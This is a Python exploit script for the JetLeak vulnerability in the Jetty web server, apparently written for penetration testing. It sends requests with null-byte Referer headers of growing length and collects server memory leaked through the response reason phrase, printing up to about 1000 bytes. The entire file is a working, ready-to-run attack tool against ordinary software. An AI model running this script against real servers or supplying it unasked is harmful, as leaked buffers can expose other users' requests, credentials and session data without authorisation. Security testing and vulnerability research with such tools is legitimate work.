#!/usr/bin/env python3
#
# Author: Stephen Haywood
# Last Modified: 2016-10-06
#
# Copyright AppSec Consulting, Inc.
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice,
#  this list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice,
#  this list of conditions and the following disclaimer in the documentation
#  and/or other materials provided with the distribution.
#
#  Neither the name of AppSec Consulting, Inc., nor the names of its
#  contributors may be used to endorse or promote products derived from this
#  software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.


import requests
import re
import sys
import time

##
# Uses the bug described here, http://blog.gdssecurity.com/labs/2015/2/25/
# jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html, to
# repeatedly request sequential, chunks of memory and store them in a string
# The script will continue to run until it has captured 1000 bytes or it has
# had to wait for two minutes. Receiving a block of null bytes will cause a
# five second wait. After 24 of these 5 second waits the script will stop
# unless it gets 1000 bytes of data first.
##

if len(sys.argv) != 2:
    print('Usage: ./jetty-bleed.py url')
    sys.exit(1)

# Compile the needed regular expression.
data_re = re.compile(r'>>>(.*)\.\.\.')

# Setup our other variables.
data = ''
iter = 1
step = 16
wait_time = 0
wait_int = 5
max_wait = 120

# Use a loop to gather as much info from the buffer as possible.
while (len(data) <= 1000) and (wait_time < max_wait):
    headers = {"Referer": chr(0) * iter}

    try:
        resp = requests.get(sys.argv[1], headers=headers)

    except Exception as e:
        print('Could not connect to server: {0}.'.format(e))
        wait_time = max_wait + 1
        break

    m = data_re.search(resp.reason)
    if m is not None:
        # If we have a match replace escaped unprintable characters with the
        # appropriate unprintable character. This prevents our byte count from
        # getting thrown off by the extra backslash character in the output.
        chunk = m.group(1)
        chunk = chunk.replace('\\r', '\r')
        chunk = chunk.replace('\\n', '\n')
        chunk = chunk.replace('\\x00', '\x00')
        step = len(chunk)

        # Don't store null bytes in our string.
        chunk = chunk.replace('\x00', '')

        # If the line is empty then wait five seconds to allow more data to be
        # put in the buffer.
        if chunk.strip('\r\n') == '':
            wait_time += wait_int
            time.sleep(wait_int)
        else:
            data += chunk

    else:
        print('No data leaked.')
        wait_time = max_wait + 1

    iter += step

# Print our final set of leaked data.
if data != '':
    print('The following data was leaked:\n{0}'.format(data))
